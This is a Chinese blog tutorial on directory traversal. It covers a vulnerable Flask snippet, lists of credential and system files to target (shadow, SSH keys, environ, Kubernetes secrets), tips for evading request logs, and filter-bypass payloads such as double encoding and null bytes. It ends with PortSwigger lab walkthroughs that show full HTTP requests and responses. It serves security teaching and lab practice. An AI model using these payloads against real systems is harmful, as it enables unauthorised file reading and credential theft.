
# [Directory Traversal](https://www.raingray.com/archives/4129.html)

目录遍历，或者国内常见翻译目录穿越。也有人遇到这类问题表现出来的现象叫任意文件下载、任意文件读取，不管叫什么他们原理都是一致的，不妨碍我们沟通，在本文中称作目录遍历。这里多一嘴有时候读取出文件内容可能是 SSRF、File Include，千万别判断错误错失漏洞。

漏洞原理也简单，在实现某个下载或读取文件功能中，逻辑错误，常常表现为代码中固定接收参数中文件名，不做过滤直接拼接存储文件的路径。

```python
@app.route('/fileDownload')
def fileDownload():
    fileName = request.args.get('file', '')

    if len(fileName) < 1:
        return

    return getFileContent("/var/www/png/" + fileName)
```

## 目录

-   [目录](#%E7%9B%AE%E5%BD%95)
-   [利用](#%E5%88%A9%E7%94%A8)
    -   [Linux](#Linux)
        -   [配置文件](#%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6)
        -   [日志](#%E6%97%A5%E5%BF%97)
        -   [/proc](#%2Fproc)
    -   [Windows](#Windows)
-   [绕过](#%E7%BB%95%E8%BF%87)
-   [防御](#%E9%98%B2%E5%BE%A1)
-   [靶场](#%E9%9D%B6%E5%9C%BA)
    -   [Web Security Academy⚒️](#Web+Security+Academy%E2%9A%92%EF%B8%8F)
        -   [Lab: File path traversal, simple case](#Lab%3A+File+path+traversal%2C+simple+case)
        -   [Lab: File path traversal, traversal sequences blocked with absolute path bypass](#Lab%3A+File+path+traversal%2C+traversal+sequences+blocked+with+absolute+path+bypass)
        -   [Lab: File path traversal, traversal sequences stripped non-recursively](#Lab%3A+File+path+traversal%2C+traversal+sequences+stripped+non-recursively)
        -   [Lab: File path traversal, traversal sequences stripped with superfluous URL-decode](#Lab%3A+File+path+traversal%2C+traversal+sequences+stripped+with+superfluous+URL-decode)
        -   [Lab: File path traversal, validation of start of path](#Lab%3A+File+path+traversal%2C+validation+of+start+of+path)
        -   [Lab: File path traversal, validation of file extension with null byte bypass](#Lab%3A+File+path+traversal%2C+validation+of+file+extension+with+null+byte+bypass)
-   [参考资料](#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99)

## 利用

此漏洞最大的作用就是信息收集。整理来说需要收集配置文件、日志两部分，因为系统原因 Linux 下由于全是文件，因此相对于 Windows 能获取的信息会多些。

在尝试读取系统文件时，应用如果支持 POST 方法，应该尽量使用，避免 GET 方法去请求，在请求日志中包含文件名，被发现攻击痕迹。当然这仅针对没有安全设备的目标有些许作用。

### Linux

Linux 本质上是文件，所以通过文件能够获取很多信息，那读哪些文件？

#### 配置文件

可以借由前面读取到的内容看看有哪些配置文件，最好是直接遍历 /etc 下常见的应用配置或应用目录下的配置文件扩大战果。

```plaintext
/etc/issue
/etc/group
/etc/hosts
/etc/motd
/etc/mysql/my.cnf
/var/run/secrets/kubernetes.io/serviceaccount
```

1.`/etc/shadow`，读取此文件可以用于判断当前应用权限是不是 root 启动，不是 root 读不了。读取成功后可以爆一波密码 SSH 登录。

2.`/etc/os-release`，看系统类型

3.`/etc/passwd`，看哪些用户能够登录系统

4.`/home/<UserName>`，读取用户目录内容

.bash\_history，找到所有能登录系统的用户名，挨个看用户执行过的历史命令。  
.ssh/id\_rsa，读取 SSH 私钥尝试用私钥登录系统。  
.ssh/known\_hosts，可以看到这个用户尝试连接过哪些机器。  
.viminfo，vim 编辑器中操作的历史记录会被保存下来，可以查看里面有没敏感信息或其他文件及路径。

7.locate 数据库

/var/lib/mlocate/mlocate.db  
/var/lib/mlocate.db

这数据库只能 root 读取，里面存放着系统所有文件索引。

#### 日志

日志主要是应用和系统的日志，先看应用。最常见的就是 Java，遇到此漏洞，通过读取 WebServer 用户 .bash\_history 执行的历史命令，找到部署应用的目录，获取 WEB-INF/web.xml 所有 Servlet 配置信息。结合 web.xml 中 `<servlet-name>` 找到对应 `<servlet-class>` com.example.FileUpload，最终定位到编译后的字节码文件 /WEB-INF/classes/com/example/FileUpload.class。下载后即可反编译得到代码进行审计。下载字节码再反编译，重复操作很麻烦，可以用 [ClassHound](https://github.com/LandGrey/ClassHound) 自动完成。

也可以读取 Tomcat 日志和配置内容：

-   logs/catalina.out，所有 Tomcat 和应用输出的日志。
-   logs/catalina.YYYY-MM-DD.log，指定日期的日志，比如 2023-01-12.log 就是二零二三年一月十二日这一天包含的日志。
-   conf/web.xml
-   conf/context.xml
-   conf/logging.properties
-   conf/server.xml
-   conf/tomcat-users.xml
-   conf/jmx/jmxremote.access  
    conf/jmx/jmxremote.password

关于日志 Gene Xu 写的介绍很全，有疑惑时可以查缺补漏 blog.csdn.net/goodbye\_youth/article/details/106709976

查到日志后推荐使用 VSCode 筛内容，Ctrl + A 全选数据，Chrl + Shift + P 选 Sort Lines Descening 排序，Delete Dumplicate Lines 去重，再来查看 URL。

这时候还是有很多重复项，可以选择性把日志时间信息删除。

```plaintext
[0-9]+.\[0-9]+.\[0-9]+.\[0-9]+ - - \[.*\]
```

还是有重复内容可以把相同的响应字节数给删除。

```plaintext
[0-9]+$
```

再重复去重一次，这样可以快速筛出想要的 API。

关于日志中可能会有中文的内容 VSCode 可以 Ctrl + F 搜索。

```plaintext
[\u4e00-\u9fa5]
```

同样的系统中其他日志也需要关注。

```plaintext
/var/log/apache/access.log
/var/log/apache/error.log
/var/log/httpd/error_log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/vsftpd.log
/var/log/sshd.log
/var/log/mail
```

#### /proc

有时进程参数中会带有路径或是配置文件等信息，有必要关注。

进程在 /proc 下，这些数字就是进程 ID。

```plaintext
ubuntu@TeamServer:~$ ls /proc
1        128  153      19       21910    2298196  249981  415311  541        bus          iomem        misc          swaps
10       129  155706   1923557  22       2298528  25      415312  551        cgroups      ioports      modules       sys
108820   13   155707   1935589  2207194  2298592  250968  415315  5893       cmdline      irq          mounts        sysrq-trigger
11       132  157      1985976  2207195  2298600  257     435397  6          consoles     kallsyms     mtrr          sysvipc
1141261  133  16       1996254  2220012  2298629  284428  4382    606483     cpuinfo      kcore        net           thread-self
117      134  17       2        2247760  2298630  3       47272   689007     crypto       key-users    pagetypeinfo  timer_list
118      135  1706198  20       225082   2298632  326     486941  701        devices      keys         partitions    tty
119      136  1706384  2015235  2270163  2298741  327     487321  709        diskstats    kmsg         pressure      uptime
12       137  1706445  2017910  2273361  2298742  328     487322  716        dma          kpagecgroup  sched_debug   version
120      138  173      2018058  2297786  2298754  329     488439  81959      driver       kpagecount   schedstat     version_signature
121      139  174      2018110  2297901  23       386921  489760  9          execdomains  kpageflags   scsi          vmallocinfo
122      14   178818   20289    2297907  24       398851  489761  90446      fb           loadavg      self          vmstat
123      141  18       20296    2297919  249876   4       511     95017      filesystems  locks        slabinfo      xen
124      142  1838601  2041619  2297920  249886   41207   518     acpi       fs           mdstat       softirqs      zoneinfo
125      15   1893933  21       2297921  249889   41208   519     buddyinfo  interrupts   meminfo      stat
```

通过读取进程 ID 目录下的的 cmdline 文件，来获取进程命令行参数。

```plaintext
/proc/<Process ID>/cmdline
```

如果权限够大还可能读取到其他内容呢，这里给出一些字典，但是没详细描述其作用。

```plaintext
/proc/1/fd/1
/proc/self/environ
/proc/version
/proc/sched_debug
/proc/mounts
/proc/net/arp
/proc/net/route
/proc/net/tcp
/proc/net/udp
/proc/self/cwd/index.php
/proc/self/cwd/main.py
```

### Windows

Windows 下不知道怎么确认漏洞，可以尝试的读取

C:\\Windows\\win.ini  
C:\\Windows\\System32\\drivers\\etc\\hosts  
iconcache.db

远控配置文件：  
老版本 VNC  
向日葵读取 config.ini 文件

甚至有些管理员习惯临时存个文件取名比较简单 C:\\Users\\Administrator\\Desktop\\1.txt，可以多遍历这些数字，如 1-10。

## 绕过

错误的防护策略依旧还是黑名单思路，比如剔除字符或检查黑名单字符，一旦规则不完善容易遗漏。

检查开头是不是 ..，可以尝试绝对路径，这个 . 表示当前路径 /etc，不会干扰获取内容。

```plaintext
/etc/./passwd
```

只检查开头是不是包含 ../，可以 ./ 绕过，后面 ../ 不管向上跳多少目录，最终只会回到根目录。

```plaintext
./../../../../../etc/passwd
```

检查正斜杠就用反斜杠。

```plaintext
\/\/etc/passwd
```

有时直接删除黑名单的特殊字符，如 ../../，再去下载过滤后的文件名。可以直接尝试绝对路径的文件。

```plaintext
/etc/passwd
```

也要检查它有没完全剔除，还是只是剔除第一个字符。比如本次剔除的是 .. 或 ../ 字符，那就多给一个看是不是剔除的不对。

```plaintext
..../..../..../etc/passwd
....//....//....//etc/passwd
```

双重编码特殊字符。具体原理见 [Lab: File path traversal, traversal sequences stripped with superfluous URL-decode](#Lab%3A+File+path+traversal%2C+traversal+sequences+stripped+with+superfluous+URL-decode)

```plaintext
%252fetc%252fpasswd
```

## 防御

限定以某文件结尾。

现有有些应用下载文件都不靠文件名作为标识，而是上传文件后返回一个 Token，通过 Token 下载文件，估计在数据库里存了 Token 和文件名映射关系。

## 靶场

### Web Security Academy⚒️

#### Lab: File path traversal, simple case

题目提示：在产品图片存在目录遍历

这里新手容易忽略的是，BurpSuite HTTP History 默认不显示图片，需要主动勾选进行展示。

直接获取没得到文件内容，说明可能拼接了文件路径。

```http
GET /image?filename=/etc/passwd HTTP/2
Host: 0a3500ac03db485180d776e7005e0046.web-security-academy.net
Cookie: session=sN3NMychB0F02a9vgCv04BmOdvELunj9
Sec-Ch-Ua: "Microsoft Edge";v="117", "Not;A=Brand";v="8", "Chromium";v="117"
Dnt: 1
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.31
Sec-Ch-Ua-Platform: "Windows"
Accept: image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: image
Referer: https://0a3500ac03db485180d776e7005e0046.web-security-academy.net/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6


HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 14

"No such file"
```

往上跳三级目录即可获取文件内容。

```http
GET /image?filename=../../../etc/passwd HTTP/2
Host: 0a3500ac03db485180d776e7005e0046.web-security-academy.net
Cookie: session=sN3NMychB0F02a9vgCv04BmOdvELunj9
Sec-Ch-Ua: "Microsoft Edge";v="117", "Not;A=Brand";v="8", "Chromium";v="117"
Dnt: 1
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.31
Sec-Ch-Ua-Platform: "Windows"
Accept: image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: image
Referer: https://0a3500ac03db485180d776e7005e0046.web-security-academy.net/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6


HTTP/2 200 OK
Content-Type: image/jpeg
X-Frame-Options: SAMEORIGIN
Content-Length: 2316

root:x:0:0:root:/root:/bin/bash
......
```

#### Lab: File path traversal, traversal sequences blocked with absolute path bypass

题意：在学习资料中提示了，这个 Lab 有遍历防护，可以尝试用绝对路径绕过。

尝试遍历会提示没有文件，很可能是把我们输入的 ../ 给剔除再去查过滤后的文件名，提示不存在。

```http
GET /image?filename=../../../../etc/passwd HTTP/2
Host: 0a3d00a704959656870b472000a700e8.web-security-academy.net
Cookie: session=LEYsrWlzEuXb1g6J2N5zwBGhSmBwwok4
Sec-Ch-Ua: "Microsoft Edge";v="117", "Not;A=Brand";v="8", "Chromium";v="117"
Dnt: 1
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.47
Sec-Ch-Ua-Platform: "Windows"
Accept: image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: image
Referer: https://0a3d00a704959656870b472000a700e8.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6


HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 14

"No such file"
```

直接给绝对路径读取到了。

```http
GET /image?filename=/etc/passwd HTTP/2
Host: 0a3d00a704959656870b472000a700e8.web-security-academy.net
Cookie: session=LEYsrWlzEuXb1g6J2N5zwBGhSmBwwok4
Sec-Ch-Ua: "Microsoft Edge";v="117", "Not;A=Brand";v="8", "Chromium";v="117"
Dnt: 1
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.47
Sec-Ch-Ua-Platform: "Windows"
Accept: image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: image
Referer: https://0a3d00a704959656870b472000a700e8.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6


HTTP/2 200 OK
Content-Type: image/jpeg
X-Frame-Options: SAMEORIGIN
Content-Length: 2316

root:x:0:0:root:/root:/bin/bash
......
```

#### Lab: File path traversal, traversal sequences stripped non-recursively

题意：应用过滤删除用户输入的文件名中的特殊字符。

正常的跳跃无法读取文件内容。

```plaintext
../../../etc/passwd
```

看了答案和 [z3nsh3ll](https://www.youtube.com/watch?v=n0M-nOEB6a8) 的讲解才发现是剔除了 ../，因此尝试尝试双写绕过。

```plaintext
....//....//....//etc/passwd
```

最终变成。

```plaintext
../../../etc/passwd
```

成功解决。

```http
GET /image?filename=./....//....//....//....//etc/passwd HTTP/2
Host: 0aa70075038c7b9580342bf200ff0002.web-security-academy.net
Cookie: session=6AXaJ0hgRNKXET1q8LIdWP3S4ycWCR7W
Sec-Ch-Ua: "Microsoft Edge";v="117", "Not;A=Brand";v="8", "Chromium";v="117"
Dnt: 1
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.47
Sec-Ch-Ua-Platform: "Windows"
Accept: image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: image
Referer: https://0a12005003ec689a81e0f336000c003c.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6


HTTP/2 200 OK
Content-Type: image/jpeg
Set-Cookie: session=6eI5Stzdmcj99g8D5HpHNqlLuE7qUXpU; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 2316

root:x:0:0:root:/root:/bin/bash
......
```

但奇怪的是反斜杠为啥无法读取，按理说没过滤才对。

```plaintext
..../\/..../\/..../etc/passwd
..\/\/..\/\/..\/\/..\/etc/passwd
```

#### Lab: File path traversal, traversal sequences stripped with superfluous URL-decode

题意：应用还是过滤了遍历，在处理前进行了 URL 解码。

试了试双写不行，二次编码也不行，防护应该不是剔除。

```plaintext
./....//....//....//etc/passwd

.%252f....%252f%252f....%252f%252f....%252f%252fetc%252fpasswd
```

看了官方答案和 [z3nsh3ll](https://www.youtube.com/watch?v=nclJPOL3PXc) 详细解答，只是把要过滤的特殊字符斜线 / 二次编码即可。

```plaintext
..%252f..%252f..%252fetc/passwd
```

因此成功解决。

```plaintext
GET /image?filename=.%252f..%252f%252f..%252f%252f..%252f%252fetc%252fpasswd HTTP/2
Host: 0af700990422e09d807c4e50007300b4.web-security-academy.net
Cookie: session=Mn7ofDrzZJBGd8aA7kE359u37yjxXgQr
Sec-Ch-Ua: "Microsoft Edge";v="117", "Not;A=Brand";v="8", "Chromium";v="117"
Dnt: 1
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.47
Sec-Ch-Ua-Platform: "Windows"
Accept: image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: image
Referer: https://0a5200070353807a805a21e800aa0009.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6


HTTP/2 200 OK
Content-Type: image/jpeg
Set-Cookie: session=tXFiKOBX8VdXvNYiChd7euvZcnveBhye; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 2316

root:x:0:0:root:/root:/bin/bash
......
```

为什么二次编码可以生效？

一个参数发送到 WebServer 会自动解码一次，最后传递给 Web 应用，此时仍然有一次编码，去判断此值不存在目录遍历关键字就认为正常，最后交给读取文件的方法去获取内容，此方法在获取文件内容过程中发现文件名存在 URL 编码，则解码去下载，因此造成漏洞。问题就在于不同组件对于 URL 编码的处理方式不同，存在绕过过滤器的可能。

#### Lab: File path traversal, validation of start of path

题意：程序验证要下载的文件参数中的路径。

一打开应用发现图片加载写的绝对路径。

```plaintext
image?filename=/var/www/images/66.jpg
```

直接读 /etc/passwd 提示需要参数。

```plaintext
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 30

"Missing parameter 'filename'"
```

根据标题来看就是验证了路径。通过给出路径跳跃到根目录解决。

```http
GET /image?filename=/var/www/images/../../..//etc/passwd HTTP/2
Host: 0a4a004003cda7c580f3120c004f003d.web-security-academy.net
Cookie: session=h7rMLeDmvobQYH0gbHJEiJCjsmJt3Kyz
Sec-Ch-Ua: "Microsoft Edge";v="117", "Not;A=Brand";v="8", "Chromium";v="117"
Dnt: 1
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.47
Sec-Ch-Ua-Platform: "Windows"
Accept: image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: image
Referer: https://0a4a004003cda7c580f3120c004f003d.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6


HTTP/2 200 OK
Content-Type: image/jpeg
X-Frame-Options: SAMEORIGIN
Content-Length: 2316

root:x:0:0:root:/root:/bin/bash
......
```

#### Lab: File path traversal, validation of file extension with null byte bypass

题意：这次验证的是文件后缀，必须以图片文件后缀结尾。

默认使用 `GET /image?filename=38.png HTTP/2` 文件名和后缀获取文件。只有通过 %00 才能绕过

```plaintext
GET /image?filename=./../../../etc/passwd%00.jpg HTTP/2
Host: 0a0a005a047b581284437d3100a600db.web-security-academy.net
Cookie: session=Jsb5FL3Bs6TL57AAUTlyBdzeLEeeQRTQ
Sec-Ch-Ua: "Microsoft Edge";v="117", "Not;A=Brand";v="8", "Chromium";v="117"
Dnt: 1
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.47
Sec-Ch-Ua-Platform: "Windows"
Accept: image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: image
Referer: https://0a0a005a047b581284437d3100a600db.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6


HTTP/2 200 OK
Content-Type: image/jpeg
X-Frame-Options: SAMEORIGIN
Content-Length: 2316

root:x:0:0:root:/root:/bin/bash
......
```

因此 %00 还是有必要尝试一下的。

## 参考资料

-   [Interaction-File-URL.pptx](https://www.raingray.com/usr/uploads/2023/06/2258492044.pptx)

最近更新：2023 年 10 月 07 日 17:00:05

发布时间：2022 年 01 月 25 日 22:22:00
